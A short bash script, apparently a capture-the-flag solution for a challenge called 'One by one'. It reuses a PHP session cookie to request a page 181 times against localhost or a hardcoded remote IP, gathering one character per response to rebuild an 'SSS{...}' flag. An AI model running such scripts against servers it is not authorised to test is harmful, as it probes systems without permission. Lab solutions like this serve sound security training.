#!/bin/bash
PORT=8090

if [[ $1 == "local" ]]
then
    remote='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    remote='http://141.85.224.118:'$PORT
else
    remote=$1':'$2
fi

# One by one
echo "Start exploit for One by one"
remote=$remote'/one-by-one/'
curl -s -c cookies.txt -o /dev/null $remote
phpsessid=$(cat cookies.txt | grep PHPSESSID | awk '{print $7}')
flag=''
for i in {1..181}
do 
    aux=$(curl -s -b 'PHPSESSID='$phpsessid'' $remote | grep -o ">.<" | grep -o "[^><]")
    flag=$flag$aux
done
flag=$(echo $flag | grep -m 1 -o "SSS{.*}")
echo "Flag is $flag"
echo "----------------------------"
